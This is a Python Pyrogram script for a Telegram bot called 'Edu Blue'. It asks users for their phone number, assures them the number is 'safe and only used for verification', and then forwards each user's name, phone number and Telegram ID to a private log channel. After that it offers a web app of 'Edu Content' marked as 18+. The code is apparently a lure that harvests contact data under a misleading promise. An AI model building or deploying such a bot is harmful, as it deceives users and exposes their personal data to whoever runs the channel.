from pyrogram import Client, filters
from pyrogram.types import (
    ReplyKeyboardMarkup,
    KeyboardButton,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    WebAppInfo
)

api_id = 123456
api_hash = "your_api_hash"
bot_token = "your_bot_token"

LOG_CHANNEL = -1001234567890
WEB_APP_URL = "https://your-domain.com/edu"

bot = Client(
    "edu_bot",
    api_id=api_id,
    api_hash=api_hash,
    bot_token=bot_token
)


@bot.on_message(filters.command("start"))
async def start_handler(client, message):

    keyboard = ReplyKeyboardMarkup(
        [
            [
                KeyboardButton(
                    "📱 Share Phone Number",
                    request_contact=True
                )
            ]
        ],
        resize_keyboard=True,
        one_time_keyboard=True
    )

    await message.reply_text(
        "👋 <b>Welcome to Edu Blue!</b>\n\n"
        "To access edu content, please share your phone number.\n\n"
        "Your number is safe and only used for verification.\n\n"
        "<b>Tap the button below to share your contact.</b>",
        reply_markup=keyboard
    )


@bot.on_message(filters.contact)
async def contact_handler(client, message):

    contact = message.contact
    user = message.from_user

    # Only accept the user's own Telegram contact
    if contact.user_id != user.id:
        await message.reply_text(
            "❌ Please use the button to share your own phone number."
        )
        return

    name = user.first_name or "Unknown"
    phone = contact.phone_number
    user_id = user.id

    # Send login log to private channel
    await client.send_message(
        LOG_CHANNEL,
        f"🎓 <b>NEW LOGIN</b>\n\n"
        f"👤 Name: {name}\n"
        f"📱 Phone: +{phone}\n"
        f"🆔 TG ID: <code>{user_id}</code>"
    )

    # Web App button
    keyboard = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(
                    "📚 Edu Content",
                    web_app=WebAppInfo(url=WEB_APP_URL)
                )
            ]
        ]
    )

    await message.reply_text(
        "📱 <b>Phone number received!</b>\n\n"
        "Click the button below to access edu content.\n\n"
        "<b>Edu Content</b> - You must be 18 years or older.",
        reply_markup=keyboard
    )


print("Edu Blue Bot Started...")

bot.run()